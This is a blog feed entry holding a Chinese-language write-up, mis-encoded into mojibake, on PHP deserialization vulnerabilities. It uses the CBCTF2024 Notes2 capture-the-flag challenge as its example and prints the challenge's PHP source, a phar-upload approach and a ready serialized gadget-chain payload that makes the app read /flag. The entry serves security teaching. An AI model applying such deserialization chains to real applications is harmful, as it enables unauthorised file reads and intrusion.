    <link href="/2025/02/01/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B0%8F%E7%BB%93/"/>
    <url>/2025/02/01/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B0%8F%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="PHPååºåˆ—åŒ–å°ç»“"><a href="#PHPååºåˆ—åŒ–å°ç»“" class="headerlink" title="PHPååºåˆ—åŒ–å°ç»“"></a>PHPååºåˆ—åŒ–å°ç»“</h1><h1 id="ä»€ä¹ˆæ˜¯åºåˆ—åŒ–ä¸ååºåˆ—åŒ–"><a href="#ä»€ä¹ˆæ˜¯åºåˆ—åŒ–ä¸ååºåˆ—åŒ–" class="headerlink" title="ä»€ä¹ˆæ˜¯åºåˆ—åŒ–ä¸ååºåˆ—åŒ–"></a>ä»€ä¹ˆæ˜¯åºåˆ—åŒ–ä¸ååºåˆ—åŒ–</h1><p>é¦–å…ˆï¼Œåºåˆ—åŒ–æ˜¯å°†å¯¹è±¡è½¬åŒ–ä¸ºå¯å­˜å‚¨æˆ–ä¼ è¾“çš„å­—ç¬¦ä¸²æ ¼å¼çš„è¿‡ç¨‹ã€‚åœ¨ php ä¸­ï¼Œå¯ä»¥ä½¿ç”¨ serialize()å‡½æ•°å°†å¯¹è±¡ï¼Œæ•°ç»„æˆ–å…¶å®ƒæ•°æ®ç±»å‹åºåˆ—åŒ–ç§°ä¸ºä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œä»¥ä¾¿å°†å…¶ä¿å­˜åˆ°æ–‡ä»¶æˆ–è€…è¿›è¡Œç½‘ç»œä¼ è¾“ã€‚</p><p>ååºåˆ—åŒ–åˆ™æ˜¯å°†ä¹‹å‰åºåˆ—åŒ–å¾—åˆ°çš„å­—ç¬¦ä¸²é‡æ–°è½¬æ¢ä¸ºåŸå§‹çš„ php æ•°æ®ç»“æ„æˆ–å¯¹è±¡çš„è¿‡ç¨‹ã€‚åœ¨ php ä¸­ï¼Œå¯ä»¥ä½¿ç”¨ unserialize()å‡½æ•°å¯¹åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²è¿›è¡Œååºåˆ—åŒ–æ“ä½œã€‚</p><p>å¦‚ä¸‹å³ä¸ºæŸä¸ªå¯¹è±¡åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²æ ·å¼</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;_0rays&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;jbn&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;phpinfo&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;pankas&quot;</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;lets&quot;</span>:<span class="hljs-number">4</span>:&#123;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;mak4r1&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;asc&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;ech0&quot;</span>;N;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;rocket&quot;</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;lets&quot;</span>:<span class="hljs-number">4</span>:&#123;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;mak4r1&quot;</span>;N;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;ech0&quot;</span>;O:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;go&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;ed_xinhu&quot;</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;lets&quot;</span>:<span class="hljs-number">4</span>:&#123;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;mak4r1&quot;</span>;N;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;ech0&quot;</span>;N;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;rocket&quot;</span>;N;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;errmis&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;/flag&quot;</span>;&#125;&#125;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;rocket&quot;</span>;N;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;errmis&quot;</span>;N;&#125;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;errmis&quot;</span>;N;&#125;&#125;<br></code></pre></td></tr></table></figure><p>åºåˆ—åŒ–çš„æ„ä¹‰ä¸»è¦åœ¨äºæ–¹ä¾¿æ•°æ®çš„å­˜å‚¨å’Œä¼ è¾“ã€‚</p><h1 id="ååºåˆ—åŒ–æ¼æ´çš„äº§ç”Ÿã€åˆ©ç”¨åŸç†"><a href="#ååºåˆ—åŒ–æ¼æ´çš„äº§ç”Ÿã€åˆ©ç”¨åŸç†" class="headerlink" title="ååºåˆ—åŒ–æ¼æ´çš„äº§ç”Ÿã€åˆ©ç”¨åŸç†"></a>ååºåˆ—åŒ–æ¼æ´çš„äº§ç”Ÿã€åˆ©ç”¨åŸç†</h1><p>ååºåˆ—åŒ–æ¼æ´çš„äº§ç”Ÿä¸»è¦å› ä¸ºå­˜åœ¨ä¸€äº›å«é­”æœ¯æ–¹æ³•çš„å¯åˆ©ç”¨çš„ç±»ã€ç”¨æˆ·å¯æ§çš„å‚æ•°ï¼Œé€šè¿‡è®¾è®¡å„ä¸ªç±»çš„å±æ€§å‚æ•°ï¼Œå®ç°ååºåˆ—åŒ–æ—¶å„ä¸ªé­”æœ¯æ–¹æ³•çš„è‡ªåŠ¨ï¼ˆè¿é”ï¼‰è°ƒç”¨ä»è€Œæ‰§è¡Œç›®çš„æ“ä½œã€‚ç›®å‰æˆ‘æ‰€æ¥è§¦åˆ°çš„ä¸€èˆ¬çš„ PHP ååºåˆ—åŒ–æ¼æ´é€šå¸¸æ­é…æ–‡ä»¶ä¸Šä¼ ï¼ŒæœåŠ¡å™¨æ¥æ”¶åºåˆ—åŒ–çš„æ–‡ä»¶åæˆ‘ä»¬é€šè¿‡ä¸€äº›æ“ä½œè®©æœåŠ¡å™¨å¯¹å…¶è¿›è¡Œååºåˆ—åŒ–å¤„ç†ã€‚</p><h1 id="é­”æœ¯æ–¹æ³•"><a href="#é­”æœ¯æ–¹æ³•" class="headerlink" title="é­”æœ¯æ–¹æ³•"></a>é­”æœ¯æ–¹æ³•</h1><p>ï¼ˆè¿™é‡Œä¸»è¦éƒ½æ˜¯ PHPï¼Œå…¶ä»–çš„å¯èƒ½ç±»ä¼¼ï¼Œè¿˜æ²¡æœ‰ç ”ç©¶ï¼‰</p><p>é­”æœ¯æ–¹å¼æ˜¯åœ¨ç‰¹å®šæƒ…å†µä¸‹ä¼šè‡ªåŠ¨è°ƒç”¨çš„ç‰¹æ®Šæ–¹æ³•ï¼Œä¼šè¦†ç›– PHP çš„é»˜è®¤æ“ä½œï¼Œå¯ä»¥è‡ªå®šä¹‰æ–¹æ³•çš„å†…å®¹ã€‚åšä¸€äº›ååºåˆ—åŒ–çš„é¢˜ç›®æ—¶éœ€è¦ç†Ÿç»ƒæŒæ¡å„ä¸ªé­”æœ¯æ–¹æ³•çš„è°ƒç”¨æ¡ä»¶ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">__construct</span>():å…·æœ‰æ„é€ å‡½æ•°çš„ç±»ä¼šåœ¨æ¯æ¬¡åˆ›å»ºæ–°å¯¹è±¡æ—¶å…ˆè°ƒç”¨æ­¤æ–¹æ³•ã€‚<br><span class="hljs-title function_ invoke__">__destruct</span>():ææ„å‡½æ•°ä¼šåœ¨åˆ°æŸä¸ªå¯¹è±¡çš„æ‰€æœ‰å¼•ç”¨éƒ½è¢«åˆ é™¤æˆ–è€…å½“å¯¹è±¡è¢«æ˜¾å¼é”€æ¯æ—¶æ‰§è¡Œã€‚<br><span class="hljs-title function_ invoke__">__toString</span>():æ–¹æ³•ç”¨äºä¸€ä¸ªç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶åº”æ€æ ·å›åº”ã€‚ä¾‹å¦‚<span class="hljs-keyword">echo</span> <span class="hljs-variable">$obj</span>;åº”è¯¥æ˜¾ç¤ºäº›ä»€ä¹ˆã€‚ æ­¤æ–¹æ³•å¿…é¡»è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¦åˆ™å°†å‘å‡ºä¸€æ¡ E_RECOVERABLE_ERROR çº§åˆ«çš„è‡´å‘½é”™è¯¯ã€‚ <br><span class="hljs-title function_ invoke__">__sleep</span>()æ–¹æ³•åœ¨ä¸€ä¸ªå¯¹è±¡è¢«åºåˆ—åŒ–ä¹‹å‰è°ƒç”¨ï¼›<br><span class="hljs-title function_ invoke__">__wakeup</span>():<span class="hljs-title function_ invoke__">unserialize</span>( )ä¼šæ£€æŸ¥æ˜¯å¦å­˜åœ¨ä¸€ä¸ª<span class="hljs-title function_ invoke__">_wakeup</span>( )æ–¹æ³•ã€‚å¦‚æœå­˜åœ¨ï¼Œåˆ™ä¼šå…ˆè°ƒç”¨_wakeupæ–¹æ³•ï¼Œé¢„å…ˆå‡†å¤‡å¯¹è±¡éœ€è¦çš„èµ„æºã€‚<br><span class="hljs-title function_ invoke__">__get</span>():å½“è°ƒç”¨ä¸€ä¸ªç±»åŠå…¶çˆ¶ç±»æ–¹æ³•ä¸­æœªå®šä¹‰çš„**å±æ€§**æ—¶<br><span class="hljs-title function_ invoke__">__set</span>():å½“è®¾ç½®ä¸€ä¸ªç±»åŠå…¶çˆ¶ç±»æ–¹æ³•ä¸­æœªå®šä¹‰çš„**å±æ€§**æ—¶<br><span class="hljs-title function_ invoke__">__invoke</span>():è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶çš„å›åº”æ–¹æ³•<br></code></pre></td></tr></table></figure><p>æ›´å…¨çš„é­”æœ¯æ–¹æ³•ä¿¡æ¯å‚è€ƒï¼š<a href="https://www.php.net/manual/zh/language.oop5.magic.php">https://www.php.net/manual/zh/language.oop5.magic.php</a></p><h1 id="ååºåˆ—åŒ–ä¾‹é¢˜"><a href="#ååºåˆ—åŒ–ä¾‹é¢˜" class="headerlink" title="ååºåˆ—åŒ–ä¾‹é¢˜"></a>ååºåˆ—åŒ–ä¾‹é¢˜</h1><h2 id="CBCTF2024-Notes2"><a href="#CBCTF2024-Notes2" class="headerlink" title="CBCTF2024 Notes2"></a>CBCTF2024 Notes2</h2><p>é¢˜ç›®æä¾›äº†æºç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// easy unserialize chain OuO</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">notes</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$filepath</span></span>)</span>&#123;<br>        <span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-variable">$filepath</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// flag in /flag , let&#x27;s go !!</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_0rays</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$jbn</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$pankas</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$this</span> -&gt; jbn))&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-variable language_">$this</span> -&gt; pankas);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ha?&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">lets</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-variable">$yolbby</span> = <span class="hljs-string">&quot;nonono&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$mak4r1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ech0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$rocket</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$errmis</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$humb1e</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span> -&gt; mak4r1);<br>        <span class="hljs-variable">$k0rian</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$humb1e</span>,-<span class="hljs-number">4</span>,-<span class="hljs-number">1</span>);<br>        <span class="hljs-variable language_">$this</span> -&gt; rocket -&gt; dbg = <span class="hljs-variable">$k0rian</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;O.o?&quot;</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span></span>)</span>&#123;<br>        <span class="hljs-built_in">self</span>::<span class="hljs-variable">$yolbby</span> = <span class="hljs-variable">$b</span>;<br>        <span class="hljs-variable">$int_barbituric</span> = <span class="hljs-variable language_">$this</span> -&gt; ech0 -&gt; gtg;<br><br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">notes</span>(<span class="hljs-variable">$this</span> -&gt; errmis);<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">go</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ed_xinhu</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$c</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(lets::<span class="hljs-variable">$yolbby</span> === <span class="hljs-string">&quot;666&quot;</span>)&#123;<br>            <span class="hljs-variable">$dilvey</span> = <span class="hljs-variable language_">$this</span> -&gt; ed_xinhu;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$dilvey</span>();<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you are going to win !&quot;</span>;<br>        &#125;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$filePath</span></span>) </span>&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filePath</span>))&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-variable">$realPath</span> = <span class="hljs-title function_ invoke__">realpath</span>(<span class="hljs-variable">$filePath</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$realPath</span>, <span class="hljs-string">&#x27;/notes&#x27;</span>) === <span class="hljs-number">0</span> ) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">listnote</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-variable">$directory</span> = <span class="hljs-string">&#x27;/notes&#x27;</span>; <br>    <span class="hljs-variable">$files</span> = <span class="hljs-title function_ invoke__">array_filter</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-variable">$directory</span>), function (<span class="hljs-variable">$file</span>) <span class="hljs-keyword">use</span> ($<span class="hljs-title">directory</span>) &#123;<br>        <span class="hljs-title">return</span> <span class="hljs-title">is_file</span>(&quot;$<span class="hljs-title">directory</span>/$<span class="hljs-title">file</span>&quot;);<br>    &#125;);<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$files</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>) &#123;<br>        <span class="hljs-variable">$link</span> = <span class="hljs-string">&#x27;&lt;a href=&quot;/index.php?note=/notes/&#x27;</span> . <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$f</span>) . <span class="hljs-string">&#x27;&quot;&gt;&#x27;</span> . <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$f</span>) . <span class="hljs-string">&#x27;&lt;/a&gt; &lt;p&gt;&lt;/p&gt;&#x27;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$link</span>;<br>    &#125;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;a href=&quot;/index.php?note=show-me-source&quot;&gt;show source&lt;/a&gt;&#x27;</span>;<br>&#125;<br><br><span class="hljs-comment">// upload your own note ? (under development)</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="hljs-string">&#x27;POST&#x27;</span>) &#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;user_note&#x27;</span>] ?? <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file</span> &amp;&amp; <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>], PATHINFO_EXTENSION)) === <span class="hljs-string">&#x27;txt&#x27;</span>) &#123;<br>        <span class="hljs-variable">$randomFileName</span> = <span class="hljs-title function_ invoke__">uniqid</span>() . <span class="hljs-string">&#x27;.txt&#x27;</span>;<br>        <span class="hljs-variable">$targetFilePath</span> = <span class="hljs-string">&quot;/notes/&quot;</span> . <span class="hljs-variable">$randomFileName</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-variable">$targetFilePath</span>)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Your note successfully saved in :&quot;</span>.<span class="hljs-variable">$targetFilePath</span>;<br>            <span class="hljs-keyword">exit</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error&quot;</span>);   <br>&#125;<br><br><span class="hljs-variable">$note</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;note&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$note</span>)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$note</span> === <span class="hljs-string">&quot;show-me-source&quot;</span>)&#123;<br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$note</span>))&#123;<br>            <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: text/plain; charset=UTF-8&#x27;</span>);<br>            <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">notes</span>(<span class="hljs-variable">$note</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;hacker...&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h1&gt;è¿™é‡Œæ˜¯makè‡ªå·±æ‚„æ‚„ç•™ç»™ä½ çš„ä¸€äº›ç¬”è®°å“¦ï¼Œæ‰“å¼€çœ‹çœ‹å§&lt;/h1&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2&gt;Notes List:&lt;h2&gt;&quot;</span>;<br>    <span class="hljs-title function_ invoke__">listnote</span>();<br>&#125;<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="è§£é¢˜è¯¦ç»†è¿‡ç¨‹"><a href="#è§£é¢˜è¯¦ç»†è¿‡ç¨‹" class="headerlink" title="è§£é¢˜è¯¦ç»†è¿‡ç¨‹"></a>è§£é¢˜è¯¦ç»†è¿‡ç¨‹</h3><h4 id="1-åˆæ­¥è§‚å¯Ÿåˆ†æï¼Œå¾—åˆ°å¤§è‡´æ–¹å‘"><a href="#1-åˆæ­¥è§‚å¯Ÿåˆ†æï¼Œå¾—åˆ°å¤§è‡´æ–¹å‘" class="headerlink" title="1.åˆæ­¥è§‚å¯Ÿåˆ†æï¼Œå¾—åˆ°å¤§è‡´æ–¹å‘"></a>1.åˆæ­¥è§‚å¯Ÿåˆ†æï¼Œå¾—åˆ°å¤§è‡´æ–¹å‘</h4><p>å¾ˆæ˜ç¡®å‘ŠçŸ¥æ˜¯ååºåˆ—åŒ–é¢˜ï¼Œå¯ä»¥åœ¨æºç çœ‹åˆ°æ–‡ä»¶ä¸Šä¼ çš„æ¥å£ï¼Œæ‰€ä»¥å…ˆä¸Šä¼ åºåˆ—åŒ– phar æ–‡ä»¶å†è§¦å‘ååºåˆ—åŒ–</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// upload your own note ? (under development)</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="hljs-string">&#x27;POST&#x27;</span>) &#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;user_note&#x27;</span>] ?? <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file</span> &amp;&amp; <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>], PATHINFO_EXTENSION)) === <span class="hljs-string">&#x27;txt&#x27;</span>) &#123;<br>        <span class="hljs-variable">$randomFileName</span> = <span class="hljs-title function_ invoke__">uniqid</span>() . <span class="hljs-string">&#x27;.txt&#x27;</span>;<br>        <span class="hljs-variable">$targetFilePath</span> = <span class="hljs-string">&quot;/notes/&quot;</span> . <span class="hljs-variable">$randomFileName</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-variable">$targetFilePath</span>)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Your note successfully saved in :&quot;</span>.<span class="hljs-variable">$targetFilePath</span>;<br>            <span class="hljs-keyword">exit</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error&quot;</span>);   <br>&#125;<br></code></pre></td></tr></table></figure><p>é¦–å…ˆè§‚å¯Ÿå¯åˆ©ç”¨çš„ç±»åŠé­”æœ¯æ–¹æ³•ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">æœ¬é¢˜ä¸­å­˜åœ¨çš„é­”æœ¯æ–¹æ³•ï¼š<br><span class="hljs-title function_ invoke__">__construct</span>():å­˜åœ¨äº**notes**ç±»ä¸­ï¼Œå…·æœ‰æ„é€ å‡½æ•°çš„ç±»ä¼šåœ¨æ¯æ¬¡åˆ›å»ºæ–°å¯¹è±¡æ—¶å…ˆè°ƒç”¨æ­¤æ–¹æ³•ã€‚<br><span class="hljs-title function_ invoke__">__toString</span>():å­˜åœ¨äº**lets**ç±»ä¸­ï¼Œæ–¹æ³•ç”¨äºä¸€ä¸ªç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶åº”æ€æ ·å›åº”ã€‚ä¾‹å¦‚<span class="hljs-keyword">echo</span> <span class="hljs-variable">$obj</span>;åº”è¯¥æ˜¾ç¤ºäº›ä»€ä¹ˆã€‚ <br><span class="hljs-title function_ invoke__">__wakeup</span>():å­˜åœ¨äº**_0rays**ç±»ä¸­ï¼Œ<span class="hljs-title function_ invoke__">unserialize</span>( )ä¼šæ£€æŸ¥æ˜¯å¦å­˜åœ¨ä¸€ä¸ª<span class="hljs-title function_ invoke__">_wakeup</span>( )æ–¹æ³•ã€‚å¦‚æœå­˜åœ¨ï¼Œåˆ™ä¼šå…ˆè°ƒç”¨__wakeupæ–¹æ³•ï¼Œé¢„å…ˆå‡†å¤‡å¯¹è±¡éœ€è¦çš„èµ„æºã€‚<br><span class="hljs-title function_ invoke__">__get</span>():å­˜åœ¨äº**go**ç±»ä¸­ï¼Œå½“è°ƒç”¨ä¸€ä¸ªç±»åŠå…¶çˆ¶ç±»æ–¹æ³•ä¸­æœªå®šä¹‰çš„**å±æ€§**æ—¶<br><span class="hljs-title function_ 